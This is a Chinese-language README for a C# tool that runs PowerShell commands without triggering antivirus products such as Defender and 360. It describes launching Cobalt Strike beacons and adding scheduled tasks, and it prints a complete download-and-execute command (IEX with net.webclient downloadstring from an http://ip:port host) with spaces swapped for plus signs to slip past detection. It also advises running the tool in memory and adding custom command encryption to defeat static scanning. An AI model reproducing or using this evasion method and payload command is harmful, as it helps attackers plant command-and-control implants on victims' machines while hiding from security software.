# powershell-bypss

powershell命令免杀的小工具，可过Defender、360等，可执行上线cobaltstrike、添加计划任务等。

**请勿使用于任何非法用途，由此产生的后果自行承担。**

上述测试环境均为实体机。

思路很简单，很久之前就有了，工具调用C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation目录下面的System.Management.Automation.dll执行底层api来绕过杀软对powershell的监控。

尝试过使用base64对命令进行编码，但是好像会被Defender检测，用纯命令反而不会，这里用+加号替换了命令中空格，当然这就是一个命令的加载器，具体怎么加密命令有各种各样的方法。

由于是C#，因此可以用execute-assembly内存执行的方式来不落地执行，不过cs本身的powerpick就实现了这个功能，这里只是单拿出来做一个小工具。

**师傅们注意避免用powershell命令，上线cobaltstrike只需要```Csharp.exe IEX+((new-object+net.webclient).downloadstring('http://ip:port/a'))```裸命令，如果以powershell开头那么还是会调用powershell被360拦截的。**

**这里只是做了个小demo，师傅们可以在demo的基础上来设置自己的命令加密方式，这样可以更有效地避免杀软的静态检测。**

![32430eaf1b8ae7db520dd85e5cc82bf](https://user-images.githubusercontent.com/48757788/198879143-1caaf6d9-2ed9-4894-9233-10ff7aa7ad39.jpg)

![d559a936be1592a0bcbbaff24e88dc8](https://user-images.githubusercontent.com/48757788/198879156-82253c57-ff50-4b21-be0d-d71253db032b.jpg)





